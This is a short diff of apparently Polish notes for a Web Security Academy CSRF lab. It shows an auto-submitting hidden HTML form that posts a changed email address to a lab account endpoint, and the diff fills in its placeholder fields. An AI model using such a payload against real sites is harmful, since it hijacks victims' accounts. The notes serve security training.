@@ -35,7 +35,7 @@ body:document.cookie
 1. Wklejamy do exploi servera: 
 ```html
 <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
-    <input type="hidden" name="$param1name" value="$param1value">
+    <input type="hidden" name="email" value="123@123.123">
 </form>
 <script>
     document.forms[0].submit();
